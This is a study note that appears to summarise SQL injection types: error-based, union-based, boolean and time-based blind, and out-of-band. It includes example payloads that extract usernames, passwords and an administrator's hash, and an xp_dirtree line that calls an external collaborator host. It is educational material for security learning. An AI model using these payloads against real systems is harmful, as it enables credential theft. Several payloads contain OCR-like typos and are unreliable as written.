# types of SQL Injection

![](../attachments/Pasted%20image%2020250202005406.png)

## In-band (classic):
· In-band SQLi occurs when the attacker uses the same communication
channel to both launch the attack and gather the result of the attack
Retrieved data is presented directly in the application web page
· Easier to exploit than other categories of SQLi
### Error:
· Error-based SQLi is an in-band SQLi technique that forces the database
to generate an error, giving the attacker information upon which to
refine their injection.
Example:
Input:
`www.random.com/app.php?id='`
Output:
`You have an error in your SQL sytax, check the manual that corresponds to your MySQL server version ...`
### Union:
· Union-based SQLI is an in-band SQLi technique that leverages the
UNION SQL operator to combine the results of two queries into a
single result set
· Example:
Input:
```
www.random.com/app.php?id=' UNION SELECT username, password FROM users --
```
Output:
```
carlos
afibh9cjnkuwcsfobs7h
administrator
tn8f921skp5dzoy7hxpk
```


## inferential (blind):
· SQLi vulnerability where there is no actual transfer of data via the web
application
· Just as dangerous as in-band SQL injection
· Attacker able to reconstruct the information by sending particular requests
and observing the resulting behavior of the DB Server.
· Takes longer to exploit than in-band SQL injection

### Boolean:
Boolean-Based Blind SQLi
· Boolean-based SQLi is a blind SQLi technique that uses Boolean
conditions to return a different result depending on whether the
query returns a TRUE or FALSE result.

Boolean-Based Blind SQLi
Example URL:
`www.random.com/app.php?id=1`

Backend Query:
`select title from product where id -1`

Payload #1 (False):
`www.randon.com/app.php?id=1 and 1=2`

Backend Query:
`select title from product where id -1 and 1-2`

Payload #2 (True):
`www.random.com/@pp.php?id-1 and 1-1`

Backend Query:
`select title from product where id -1 and 1-1`

Users Table:
```
Administrator / e3c33e889e0e1b62cb7f65c63b60c42bd77275d0e730432fc37b7e624b09ad1f
```

Payload:
```
www.random.com/app.php?id=1 and SUBSTRING( (SELECT Password FROM Users WHERE Username = "Administrator'), 1,
1) - 's'
```
Backend Query:
```
select title from product where id =1 and SUBSTRING((SELECT Password FROM Users WHERE Username =
'Administrator'), 1, 1) = 's'
```


Nothing is returned on the page --> 
Returned False -->
's' is NOT the first character of the hashed password

Payload:
```

www.random.com/app.php?id=1 and SUBSTRING( (SELECT Password FROM Users WHERE Username = "Administrator'), 1,
1) = 'e'
```

Backend Query:
```

select title from product where id =1 and SUBSTRING((SELECT Password FROM Users WHERE Username .
'Administrator'), 1, 1) = 'e'
```


litle of product id 1 is returned on the page -->
Returned True .--> "e' IS the first character of the hashed password


### Time:

· Time-based SQLi is a blind SQLi technique that relies on the database
pausing for a specified amount of time, then returning the results,
indicating a successful SQL query execution.
· Example Query:
If the first character of the administrator's hashed password is an 'a', wait for 10
seconds.
> response takes 10 seconds > first letter is 'a'
> response doesn't take 10 seconds > first letter is not 'a'



## Out-of-Band:

· Vulnerability that consists of triggering an out-of-band network
connection to a system that you control.
· Not common
· A variety of protocols can be used (ex. DNS, HTTP)
· Example Payload:
: exec master .. xp_dirtree '//0efdymgwlo5w9inae8mg4dfrgim9ay.burpcollaborator.net/a' --
